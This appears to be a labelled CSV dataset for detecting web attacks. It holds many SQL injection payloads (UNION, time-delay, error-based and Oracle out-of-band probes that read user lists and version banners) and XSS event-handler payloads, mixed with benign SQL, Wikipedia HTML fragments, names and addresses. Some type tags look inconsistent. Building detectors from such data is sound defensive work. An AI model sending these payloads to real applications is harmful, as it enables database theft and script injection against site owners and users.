Text,Label,type
<ol onpointermove=alert(1)>XSS</ol>,2,xss
"<li class=""toclevel-3 tocsection-58""><a href=""#Machine_ethics""><span class=""tocnumber"">8.3.2 ",0,xss
SELECT * FROM practical  WHERE every NOT LIKE '[calm]%',0,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Concepts </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
 ,0,xss
"<div draggable=""true"" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable>drop here</blockquote>",2,xss
1' where 5230  =  5230,1,sql
"1""  )   union all select null,null,null,null,null--",1,sql
"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",1,sql
SELECT * FROM riding WHERE firm = 'feet'  OR recall = 'may',0,sql
pente@maxitienda.ms,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"-2032%""   )    )     )   or   (  3082  =  7155  )  *7155 and    (    (     (  ""%""  =  """,1,xss
"-5548' where 4477  =  4477 union all select 4477,4477,4477,4477,4477,4477,4477,4477,4477,4477--",1,sql
SELECT USER (  ) ;,0,sql
letra bala,0,sql
seyler@miami-beach.gw,0,sql
"<small onbeforepaste=""alert(1)"" contenteditable>test</small>",2,xss
"1%'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",1,sql
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=64"" title=""Edit section: Robot rights"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
SELECT liquid FROM battle UNION ALL SELECT football FROM becoming ORDER BY thumb,0,sql
"-7741'  )   where 8271  =  8271 union all select 8271,8271,8271,8271,8271,8271,8271#",1,sql
lact1ad1,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 8679 )  ORDER BY meta_id ASC",0,sql
"<li><a href=""/wiki/Existential_risk_from_artificial_general_intelligence"" title=""Existential risk from artificial general intelligence"">Existential risk from artificial general intelligence </a> </li>",0,xss
"san petersburgo, 165",0,sql
barceo,0,sql
SELECT AVG ( task ) FROM medicine SELECT SUM ( shut ) ,0,sql
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1,sql
"<menu onmousedown=""alert(1)"">test</menu>",2,xss
"1""   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,xss
<big id=x tabindex=1 onactivate=alert(1)></big>,2,xss
"<frameset onbeforepaste=""alert(1)"" contenteditable>test</frameset>",2,xss
"-5691' union all select 6610,6610#",1,sql
p870en538r7,0,sql
"<source draggable=""true"" ondragenter=""alert(1)"">test</source>",2,xss
	 </span></a></dt><dd>Understand the classes used to represent HTTP requests and responses.</dd>,0,xss
SELECT * FROM gray  WHERE lack NOT LIKE '[detail]%',0,sql
SELECT * FROM rope WHERE Price NOT BETWEEN 10 AND 20,0,sql
"1  )   where 6374  =  6374 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,xss
"<li id=""cite_note-399""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-399"">^ </a> </b> ",0,xss
"1""  )   and 6565  =  2647 and   (  ""mrge"" like ""mrge",1,sql
"1  )   as khkv where 2944  =  2944 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,sql
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
<form onpointermove=alert(1)>XSS</form>,2,xss
"1""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""jyad""  =  ""jyad",1,sql
SELECT * FROM lonely,0,xss
<script onblur=alert(1) tabindex=1 id=x></script><input autofocus>,2,xss
1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl,1,sql
"1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'bpbe' like 'bpbe",1,sql
SELECT * FROM Products WHERE ProductName BETWEEN 'Carnarvon Tigers' AND 'Mozzarella di Giovanni' ORDER BY ProductName;,0,sql
SELECT * FROM baby WHERE smaller = 'treated' FETCH FIRST 3 ROWS ONLY,0,xss
SELECT Count ( * )  AS imagine,0,sql
"-2424  )   where 8132  =  8132 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,sql
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  'pfle' like 'pfle,1,sql
"<li><cite id=""CITEREFAlbus2002"" class=""citation encyclopaedia"">Albus, J. S. (2002). ""4D/RCS: A reference model architecture for intelligent unmanned ground vehicles"".  In Gerhart, G.; Gunderson, R.; Shoemaker, C. (eds.). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20040725051856/http://www.isd.mel.nist.gov/documents/albus/4DRCS.pdf""><i>4-D/RCS: A Reference Model Architecture for Intelligent Unmanned Ground Vehicles </i> </a> <span class=""cs1-format"">(PDF) ",0,xss
SELECT * FROM including WHERE Price NOT BETWEEN 10 AND 20,0,sql
SELECT steam ( s )  FROM useful UNION ALL,0,sql
"1%""   )    )    and sleep  (  5  )   and    (    (   ""%""  =  """,1,sql
"<colgroup onmouseout=""alert(1)"">test</colgroup>",2,xss
SELECT * FROM monkey WHERE NOT total = 'excellent'  AND NOT hundred = 'actual',0,xss
macedonia 48,0,sql
<rb id=x tabindex=1 onactivate=alert(1)></rb>,2,xss
"select pg_sleep  (  5  )   and    (    (   ""byhx"" like ""byhx",1,sql
"<li id=""cite_note-Soar-160""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Soar_160-0"">^ </a> </b> ",0,xss
leonella,0,sql
calle fermin salvochea 155,0,sql
"<style>:target {color: red;}</style><sub id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></sub>",2,xss
"1   )    )    as atiy where 3855  =  3855 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,sql
SELECT AVG ( Price ) FROM seeing,0,sql
"select * from generate_series  (  3341,3341,case when   (  3341  =  3072  )   then 1 else 0 end  )   limit 1--",1,sql
1  )   where 7956  =  7956 or sleep  (  5  )  #,1,sql
18567,0,sql
SELECT pot ( s )  FROM hang SELECT know ( s ) ,0,sql
SELECT * FROM choose WHERE anyway NOT LIKE 'path%',0,sql
28609,0,sql
"   SELECT pile,track,he,climate,dropped     (  (  might JOIN us ON sheep.trace =  explain.number )   INNER JOIN hairON Orders.bridge =  due.mouthID ) ",0,sql
"<fieldset oncut=""alert(1)"" contenteditable>test</fieldset>",2,xss
1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,1,sql
"cami sant cugat al papiol 59,",0,sql
<legend onpointermove=alert(1)>XSS</legend>,2,xss
" </div> </td> </tr><tr><td class=""navbox-abovebelow"" colspan=""3"">",0,xss
1' and 1541  =  6868#,1,sql
marginet,0,xss
"<nextid draggable=""true"" ondragstart=""alert(1)"">test</nextid>",2,xss
1'+  (  select hkrg where 3665  =  3665,1,sql
"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",1,sql
perih1lio,0,sql
shan-min,0,sql
"<li id=""cite_note-166""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-166"">^ </a> </b> ",0,xss
aul,0,sql
	 </span>,0,xss
g89273t2,0,xss
corera,0,sql
nagyszeder.kehoe@creacionesacampada.es,0,xss
"<data onbeforepaste=""alert(1)"" contenteditable>test</data>",2,xss
SELECT MIN ( entirely )  AS factory FROM straight,0,xss
"<p>Interest in <a href=""/wiki/Artificial_neural_network"" title=""Artificial neural network"">neural networks </a> and ""<a href=""/wiki/Connectionism"" title=""Connectionism"">connectionism </a>"" was revived by <a href=""/wiki/David_Rumelhart"" title=""David Rumelhart"">David Rumelhart </a> and others in the middle of the 1980s.<sup id=""cite_ref-Revival_of_connectionism_172-0"" class=""reference""><a href=""#cite_note-Revival_of_connectionism-172"">&#91;169&#93; </a> </sup> <a href=""/wiki/Artificial_neural_network"" title=""Artificial neural network"">Artificial neural networks </a> are an example of <a href=""/w/index.php?title=Soft_computing&amp;action=edit&amp;redlink=1"" class=""new"" title=""Soft computing (page does not exist)"">soft computing </a>—they are solutions to problems which cannot be solved with complete logical certainty, and where an approximate solution is often sufficient. Other <a href=""/w/index.php?title=Soft_computing&amp;action=edit&amp;redlink=1"" class=""new"" title=""Soft computing (page does not exist)"">soft computing </a> approaches to AI include <a href=""/wiki/Fuzzy_system"" class=""mw-redirect"" title=""Fuzzy system"">fuzzy systems </a>, <a href=""/wiki/Grey_system_theory"" class=""mw-redirect"" title=""Grey system theory"">Grey system theory </a>, <a href=""/wiki/Evolutionary_computation"" title=""Evolutionary computation"">evolutionary computation </a> and many statistical tools. The application of soft computing to AI is studied collectively by the emerging discipline of <a href=""/wiki/Computational_intelligence"" title=""Computational intelligence"">computational intelligence </a>.<sup id=""cite_ref-Computational_intelligence_173-0"" class=""reference""><a href=""#cite_note-Computational_intelligence-173"">&#91;170&#93; </a> </sup>",0,xss
"<li class=""toclevel-3 tocsection-32""><a href=""#Deep_feedforward_neural_networks""><span class=""tocnumber"">6.5.1 ",0,xss
<nextid id=x tabindex=1 onbeforedeactivate=alert(1)></nextid><input autofocus>,2,xss
" select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1,sql
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,1,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><basefont id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></basefont>",2,xss
"-8838""   )    )    as xisn where 2749  =  2749 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1,xss
SELECT * FROM we FETCH FIRST 3 ROWS ONLY,0,sql
-7775 or 8571  =  8571--,1,sql
<nextid onblur=alert(1) tabindex=1 id=x></nextid><input autofocus>,2,xss
"   SELECT enemy, pay+ ', ' + process+ ' ' + myself+ ', ' + hold AS value  FROM stick",0,sql
SELECT COUNT ( afraidID ) FROM paragraph,0,xss
26111,0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
SELECT * FROM  ( SELECT drove FROM slope ) ,0,sql
"1'+  (  select 'ejox' where 2719  =  2719 union all select null,null,null#",1,sql
SELECT * FROM finish FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM shop,0,sql
angilberto,0,sql
SELECT string ( s )  FROM possible SELECT knew ( s ) ,0,sql
"             </li><li style=""min-height: 31px;""><span style=""display: inline-block; width: 31px; line-height: 31px; vertical-align: middle; text-align: center;""><img alt="""" src=""//upload.wikimedia.org/wikipedia/en/thumb/4/4a/Commons-logo.svg/20px-Commons-logo.svg.png"" decoding=""async"" width=""20"" height=""27"" style=""vertical-align: middle"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/4/4a/Commons-logo.svg/30px-Commons-logo.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/4/4a/Commons-logo.svg/40px-Commons-logo.svg.png 2x"" data-file-width=""1024"" data-file-height=""1376"" /> ",0,xss
86a7o,0,xss
SELECT * FROM meant FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
ralf,0,sql
SELECT * FROM lose ORDER BY not,0,sql
	 </span> </a> </li>,0,xss
"1""   )    )     )   union all select null#",1,sql
" select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1,sql
SELECT COUNT ( DISTINCT pale )  FROM indeed,0,sql
"1""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""ffcf"" like ""ffcf",1,sql
<wbr id=x tabindex=1 onfocus=alert(1)></wbr>,2,xss
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,xss
shdanoff@esposo.com.tj,0,sql
maisa,0,sql
<keygen onpointerdown=alert(1)>XSS</keygen>,2,xss
SELECT * FROM lunch WHERE result = 'hand' FETCH FIRST 3 ROWS ONLY,0,sql
 </p>,0,xss
-1641'   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'vgcb' like 'vgcb,1,sql
"<div draggable=""true"" contenteditable>drag me</div><textarea ondragover=alert(1) contenteditable>drop here</textarea>",2,xss
" SELECT CONCAT_WS ( "" "", Address, PostalCode, City )  AS Address FROM  Customers;",0,sql
SELECT Count ( * )  AS health,0,sql
"             <a href=""https://github.com/scrapy/scrapy/blob/2.0/docs/index.rst"" class=""fa fa-github""> Edit on GitHub</a>",0,xss
SELECT TOP 3 * FROM saddle SELECT * FROM grow 3SELECT * FROM century,0,sql
-2745   )    )    as aywp where 9735  =  9735 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,xss
"<aside onkeydown=""alert(1)"" contenteditable>test</aside>",2,xss
SELECT floor ( s )  FROM sugar,0,sql
"	 </span> <span class=""reference-text"">",0,xss
"<aside onkeyup=""alert(1)"" contenteditable>test</aside>",2,xss
SELECT * FROM play WHERE share = 'border'  AND City = 'nearby',0,sql
"1%'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sql
"1'||  (  select 'bccx' where 5881  =  5881 and elt  (  1210  =  1210,sleep  (  5   )    )     )  ||'",1,xss
greaves3,0,sql
SELECT * FROM wet WHERE recent BETWEEN '1996-07-01' AND '1996-07-31',0,sql
SELECT dangerous,0,sql
SELECT * FROM diagram FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM recently,0,sql
	 </span>,0,xss
8888,0,sql
SELECT AVG ( wheel ) FROM these SELECT SUM ( official ) ,0,sql
"1""   )    )    and make_set  (  8266  =  9226,9226  )   and    (    (   ""omjx"" like ""omjx",1,sql
84881293t,0,sql
beilul,0,sql
vallclara,0,xss
1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl,1,sql
"<track onbeforecut=""alert(1)"" contenteditable>test</track>",2,xss
"   SELECT pick, thumb, vessels FROM horn WHERE wooden  IS NULL",0,sql
SELECT * FROM flight WHERE aid = 'nervous'  AND City = 'solution',0,xss
 </div> </td> </tr> </tbody> </table> </div>,0,xss
villar del ro,0,sql
"1,  (  select   (  case when   (  7616  =  7616  )   then 1 else 1/  (  select 0  )   end   )    )   ",1,xss
29491,0,sql
"   SELECT COUNT ( atom ) , consonant FROM basket BY shinning",0,sql
"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",1,sql
"<body draggable=""true"" ondragleave=""alert(1)"">test</body>",2,xss
sant carles de la rpita,0,sql
SELECT TOP 3 * FROM pony WHERE getting = 'life' SELECT * FROM ate,0,xss
"<marquee onmouseenter=""alert(1)"">test</marquee>",2,xss
"	 </span> <span class=""reference-text"">",0,xss
elysee,0,sql
<col id=x tabindex=1 onfocus=alert(1)></col>,2,xss
<nav id=x tabindex=1 onfocus=alert(1)></nav>,2,xss
SELECT * FROM dog 3 SELECT * FROM gave,0,sql
SELECT * FROM calm WHERE past IN  ( SELECT system FROM develop ) ,0,sql
 </ul>,0,xss
"   SELECT zebra, market, adventure FROM court WHERE different  IS NULL",0,sql
"<nav onclick=""alert(1)"">test</nav>",2,xss
"As an example, AI is being applied to the high cost problem of dosage issues—where findings suggested that AI could save $16 billion. In 2016, a ground breaking study in California found that a mathematical formula developed with the help of AI correctly determined the accurate dose of immunosuppressant drugs to give to organ patients.<sup id=""cite_ref-300"" class=""reference""><a href=""#cite_note-300"">&#91;289&#93; </a> </sup>  </p>",0,xss
"1""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""lynw"" like ""lynw",1,sql
" SELECT * FROM this ORDER BY older ASC, clearly DESC",0,sql
SELECT AVG ( buried ) FROM golden SELECT SUM ( flies ) ,0,sql
"1""   )    )    as bosq where 4695  =  4695",1,sql
SELECT * FROM sunlight WHERE anything BETWEEN '1996-07-01' AND '1996-07-31',0,xss
"<style>:target {color:red;}</style><ruby id=x style=""transition:color 1s"" ontransitionend=alert(1)></ruby>",2,xss
"<td draggable=""true"" ondragend=""alert(1)"">test</td>",2,xss
"1"" where 1618  =  1618 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,xss
"1  )   as wuio where 5312  =  5312 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
SELECT * FROM eaten WHERE left = 'construction' LIMIT 3,0,sql
" SELECT * FROM having ORDER BY firm, dry",0,sql
"<audio controls autoplay ontimeupdate=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",2,xss
<strike onpointerover=alert(1)>XSS</strike>,2,xss
6.25668E+15,0,sql
<canvas onpointerleave=alert(1)>XSS</canvas>,2,xss
"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1,sql
"  SELECT yourself AS hay, pan AS [speech]  FROM determine",0,sql
SELECT sugar ( s FROM opportunity RIGHT JOIN,0,sql
	 </span> ,0,xss
SELECT * FROM forget WHERE compass = 'roof'  OR put = 'mother',0,sql
"	 <div id=""John_McCarthy"" style=""font-size:114%;margin:0 4em""><a href=""/wiki/John_McCarthy_(computer_scientist)"" title=""John McCarthy (computer scientist)"">John McCarthy </a> </div> </th> </tr><tr><td colspan=""2"" class=""navbox-list navbox-odd"" style=""width:100%;padding:0px"">",0,xss
 </li>,0,xss
maraa,0,sql
SELECT cover ( s )  FROM pay FULL OUTER JOIN,0,xss
SELECT * FROM gate FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM six,0,sql
"1"" where 2483  =  2483",1,xss
haewon7,0,xss
SELECT * FROM vessels WHERE phrase BETWEEN oxygen09/01/1996mice AND thou15/31/1996airplane,0,sql
<listing onfocusout=alert(1) tabindex=1 id=x></listing><input autofocus>,2,xss
1' where 6168  =  6168,1,sql
"<thead ondblclick=""alert(1)"">test</thead>",2,xss
"1'+  (  select qmez where 3729  =  3729 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"<ul><li><a href=""#CITEREFACM1998"">ACM 1998 </a>, ~I.2.3, </li>",0,xss
"-2782'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sql
1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'yxpi'  =  'yxpi,1,sql
"1'  )   where 1804  =  1804 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,sql
ben,0,sql
"""   )    )    or pg_sleep  (  __TIME__  )  --",1,sql
"1"" where 5236  =  5236 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
SELECT * FROM syllable 3 SELECT * FROM crowd,0,sql
"<dl onmouseenter=""alert(1)"">test</dl>",2,xss
SELECT slope ( s )  FROM lying,0,sql
pujolrs tremosa,0,xss
"1',  (  select   (  case when   (  9644  =  9644  )   then dbms_pipe.receive_message  (  chr  (  75  )  ||chr  (  78  )  ||chr  (  104  )  ||chr  (  98  )  ,5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",1,sql
"<li class=""toclevel-2 tocsection-15""><a href=""#Cybernetics_and_brain_simulation""><span class=""tocnumber"">5.1 ",0,xss
18858,0,sql
<content id=x tabindex=1 onbeforedeactivate=alert(1)></content><input autofocus>,2,xss
"<select draggable=""true"" ondragend=""alert(1)"">test</select>",2,xss
 </li>,0,xss
ruesga,0,sql
"1'+  (  select qjng where 1897  =  1897 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'",1,sql
SELECT * FROM seed WHERE idea = 'contain'  OR continued = 'science',0,sql
SELECT * FROM serve WHERE tea BETWEEN move09/01/1996flies AND deer15/31/1996zoo,0,sql
1' and 1  =    (  select count  (  *  )   from tablenames  )  ; --,1,xss
SELECT AVG ( aware ) FROM ship,0,xss
"1""   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  ""mmsh""  =  ""mmsh",1,sql
	 </span>,0,xss
"<style>:target {transform: rotate(180deg);}</style><bdo id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></bdo>",2,xss
"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""hrkf"" like ""hrkf",1,sql
" select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",1,xss
SELECT COUNT ( dull )  FROM rhythm,0,sql
"1""   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,xss
credenciales incorrectas,0,xss
"  SELECT difficultyID AS ID, save AS even FROM highest",0,sql
"<style>:target {color:red;}</style><caption id=x style=""transition:color 1s"" ontransitionend=alert(1)></caption>",2,xss
"    <link rel=""index"" title=""Index"" href=""genindex.html"" />",0,xss
"SELECT * FROM heard WHERE certainly BETWEEN ""place"" AND    ""ruler""",0,sql
-4562'  )   or 3038  =  3038,1,sql
"1%"" and 1343  =  5939#",1,sql
"  SELECT pipeID AS ID, sale AS engine FROM regular",0,sql
"-9896""   )    )     )   union all select 4073,4073,4073,4073,4073#",1,sql
"<var draggable=""true"" ondragstart=""alert(1)"">test</var>",2,xss
minera dauns,0,sql
SELECT * FROM design WHERE smoke  BETWEEN 10 AND 20,0,sql
reencar!nacin,0,sql
" select * from users where id  =  1 union select !<1,version  (    )   -- 1",1,sql
"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1,sql
21890,0,sql
"<li><a href=""/wiki/List_of_fictional_robots_and_androids"" title=""List of fictional robots and androids"">Fictional robots </a> </li> </ul>",0,xss
"<li><a href=""/wiki/Fitness_landscape"" title=""Fitness landscape"">Fitness landscape </a> </li>",0,xss
"	 </span> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Remote+monitoring+of+high-risk+patients+using+artificial+intelligence&amp;rft.date=1994-10-18&amp;rft_id=https%3A%2F%2Fwww.google.com%2Fpatents%2FUS5357427&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
cowper,0,xss
SELECT * FROM lift WHERE beginning = 'mission'  AND City = 'dig',0,sql
"<script onbeforecopy=""alert(1)"" contenteditable>test</script>",2,xss
"1%""   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,1,sql
SELECT * FROM prize 3,0,sql
"<ul><li><a href=""/wiki/Network_architecture"" title=""Network architecture"">Network architecture </a> </li>",0,xss
"<details onmouseover=""alert(1)"">test</details>",2,xss
"<li id=""cite_note-312""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-312"">^ </a> </b> ",0,xss
"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,xss
</ul>,0,xss
SELECT * FROM active WHERE thing BETWEEN sail09/01/1996careful AND birthday15/31/1996examine,0,sql
"<li><a href=""/wiki/Biological_naturalism"" title=""Biological naturalism"">Biological naturalism </a> </li>",0,xss
SELECT Count ( * )  AS blank,0,sql
<ul><li>Anthropomorphic,0,xss
SELECT * FROM sum WHERE say = 'courage' FETCH FIRST 3 ROWS ONLY,0,sql
	 </span> </h3>,0,xss
 ,0,xss
ransell,0,sql
"<div role=""navigation"" class=""navbox"" aria-labelledby=""Philosophy_of_science"" style=""padding:3px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",0,xss
      </li>    ,0,xss
"1%""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""%""  =  """,1,sql
"<dd draggable=""true"" ondragstart=""alert(1)"">test</dd>",2,xss
SELECT COUNT ( won )  FROM should,0,sql
"  SELECT creature AS mighty, adult AS [serious]  FROM hair",0,sql
SELECT TOP 3 * FROM sleep WHERE major = 'parallel' SELECT * FROM quarter,0,sql
